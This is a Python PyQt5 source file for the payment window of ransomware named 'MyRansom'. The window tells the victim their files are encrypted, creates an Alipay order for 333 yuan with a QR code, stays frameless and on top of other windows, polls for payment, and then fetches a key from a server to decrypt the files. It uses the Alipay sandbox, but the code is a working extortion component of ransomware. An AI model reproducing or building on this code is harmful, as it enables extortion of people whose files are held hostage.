import time
import qrcode
import os
import sys
import threading
from client import Client
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from alipay import AliPay
from UI.Ui_pay import *

CUR_PATH = os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.path.dirname(__file__)

if not os.path.exists(f'{CUR_PATH}/qr'):
    os.mkdir(f'{CUR_PATH}/qr')
app_private_key_string = open(f'{CUR_PATH}/rsa_alipay/app_private.txt').read()
alipay_public_key_string = open(f'{CUR_PATH}/rsa_alipay/alipay_public.txt').read()
alipay = AliPay(
    appid="2016102400752486",
    app_notify_url=None,  # 默认回调url
    app_private_key_string=app_private_key_string,
    # 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥
    alipay_public_key_string=alipay_public_key_string,
    sign_type="RSA2",  # RSA 或者 RSA2
    debug = True  # 默认False
)

client = Client()

button_style = '''
                QPushButton
                {text-align:center; background-color:white; font:bold; 
                border-color:gray; border-width:2px; border-radius: 10px; 
                padding:6px; height:14px; border-style:outset; font:20px;}
                QPushButton:pressed
                {text-align:center; background-color:LightGray; font:bold; 
                border-color:gray; border-width:2px; border-radius:10px; 
                padding:6px; height:14px; border-style:outset; font:20px;}
                '''
widget_style = '''QWidget{
                    color:#232C51; background:white; border-radius:13px}'''
widget_style1 = '''QWidget{
                    color:#232C51; background:white;}'''
widget_style2 = '''QWidget{
                    color:#232C51; background:LightGray; 
                    border-top-left-radius:13px; border-bottom-left-radius:13px}'''
widget_style3 = '''QWidget{
                    color:#232C51; background:LightGray;
                    border-top-right-radius:13px; border-bottom-right-radius:13px;}'''


# 支付窗口
class Pay_window(QMainWindow, Ui_PayWindow):
    def __init__(self, parent=None):
        super(Pay_window, self).__init__(parent)
        self.setupUi(self)
        # 创建预付款订单及对应二维码
        self.subject = "测试"
        self.out_trade_no = int(time.time())
        self.total_amount = 333
        preCreateOrder(self.subject, self.out_trade_no, self.total_amount)

        self.setFixedSize(self.width(), self.height())    # 禁止调整大小
        self.setWindowOpacity(0.9) # 设置窗口透明度
        self.setAttribute(QtCore.Qt.WA_TranslucentBackground) # 设置窗口背景透明
        # 去掉窗口标题栏、去掉任务栏显示、窗口置顶、禁止关闭窗口
        self.setWindowFlags(QtCore.Qt.FramelessWindowHint|QtCore.Qt.WindowStaysOnTopHint|QtCore.Qt.Tool|QtCore.Qt.WindowMinimizeButtonHint)

        self.widget.setStyleSheet(widget_style1)
        self.widget_2.setStyleSheet(widget_style2)
        # 结束页面
        self.widget_3.setStyleSheet(widget_style)
        self.widget_3.setHidden(True)
        # 日志界面
        self.widget_4.setStyleSheet(widget_style3)

        # 刷新二维码按钮
        self.pushButton.clicked.connect(self.btn_refresh)
        self.pushButton.setHidden(True)
        self.pushButton.setStyleSheet(button_style)
        # 关闭按钮
        self.pushButton_2.clicked.connect(QCoreApplication.instance().quit)
        self.pushButton_2.setStyleSheet(button_style)

        self.init_window(self.out_trade_no, self.total_amount)

    # 初始化界面
    def init_window(self, out_trade_no, total_amount):
        self.label_2.setPixmap(QPixmap(f'{CUR_PATH}/qr/{out_trade_no}.png'))
        self.label_2.setScaledContents(True)    # 让图片自适应label大小
        self.label.setText(f'请支付{total_amount}元')
        self.print_logs(f'交易创建 订单号:{out_trade_no} 付款金额:{total_amount}')
        self.tray.setIcon(QtGui.QIcon(f'{CUR_PATH}/UI/icon.png')) #设置系统托盘图标
        self.thread = threading.Thread(target=self.query_order, args=(self.out_trade_no,))
        self.thread.setDaemon(True)
        self.thread.start()     

    # 刷新二维码
    def btn_refresh(self):
        self.out_trade_no = int(time.time())
        preCreateOrder(self.subject, self.out_trade_no, self.total_amount)
        self.init_window(self.out_trade_no, self.total_amount)
        self.pushButton.setHidden(True)

    # 打印日志
    def print_logs(self, log):
        # print('*'*60)
        # print(log)
        # print('*'*60)
        self.listWidget.addItem(log)

    def iconActivated(self,reason):
        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=1) 
        time.sleep(1)
        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=2)
        time.sleep(1)
        self.tray.showMessage("MyRansom", '你的文件被加密了！', icon=3) 


    # 查询订单支付情况
    def query_order(self, out_trade_no, cancel_time=600):
        '''
        :param out_trade_no: 订单号
        :param cancel_time: 自动取消时间
        :return: None
        '''
        self.label_3.setText(f'请在{cancel_time//60}分钟内使用支付宝扫码支付')
        start_time = time.time()
        get_qr = False    # 判断是否扫码成功
        while time.time()-start_time <= cancel_time:
            # wait_time = int(time.time() - start_time)
            # self.label_3.setText(f'请在{cancel_time-wait_time}秒内使用支付宝扫码支付')
            # # 最后30秒改变字体
            # if cancel_time-wait_time == 30: 
            #     font = QFont()
            #     font.setFamily('Consolas')
            #     font.setPointSize(12)
            #     font.setBold(True)
            #     self.label_3.setFont(font)
            #     self.label_3.setStyleSheet("color:red")
            # 每隔1秒检查支付情况
            time.sleep(1)
            try:
                result = alipay.api_alipay_trade_query(out_trade_no=out_trade_no)
                # print(result)
            except: 
                # print('error')
                continue
            # 扫码成功
            if not get_qr and result.get('msg') == 'Success':
                get_qr = True
                self.print_logs(f'扫码成功')
            # 交易成功
            if result.get("trade_status", "") == "TRADE_SUCCESS":
                # print(f'交易成功返回值：{result}')
                self.print_logs(f'付款成功 订单号:{out_trade_no} 付款金额:{self.total_amount}')
                try: os.remove(f'{CUR_PATH}/qr/{out_trade_no}.png')
                except: pass
                # self.send_message(result)
                if client.get_key(out_trade_no):
                    client.dec_file()
                    self.widget_3.setVisible(True)
                    return
                else:
                    self.print_logs(f'服务器未检测到付款 订单号:{out_trade_no} 付款金额:{self.total_amount}')
                    return 
        # 交易超时
        try: os.remove(f'{CUR_PATH}/qr/{out_trade_no}.png')
        except: pass
        result = alipay.api_alipay_trade_cancel(out_trade_no=out_trade_no)
        # print(f'取消过期订单返回值：{result}')
        self.print_logs(f'取消过期订单 订单号:{out_trade_no}')
        # if result.get('msg')=='Success': print('交易超时')
        # else: print('请求失败：', result.get('msg'))
        self.pushButton.setVisible(True)
        return

    # 向服务端发送消息
    def send_message(self, message):
        print(message)


# 创建预付订单
def preCreateOrder(subject:'order_desc' , out_trade_no:int, total_amount):
    '''
    :param subject: 订单名称
    :param out_trade_no: 订单号
    :param total_amount: 付款金额
    :return None
    '''
    result = alipay.api_alipay_trade_precreate(
        subject=subject,
        out_trade_no=out_trade_no,
        total_amount=total_amount)
    # print('创建预付订单返回值：', result)
    code_url = result.get('qr_code')
    if not code_url:
        print(result.get('预付订单创建失败：', 'msg'))
        return
    else:
        # 创建二维码
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=1
        )
        qr.add_data(code_url)  # 二维码所含信息
        img = qr.make_image()  # 生成二维码图片
        img.save(f'{CUR_PATH}/qr/{out_trade_no}.png')


if __name__ == '__main__':
    app = QApplication(sys.argv)

    pay_window = Pay_window()
    pay_window.show()

    sys.exit(app.exec_())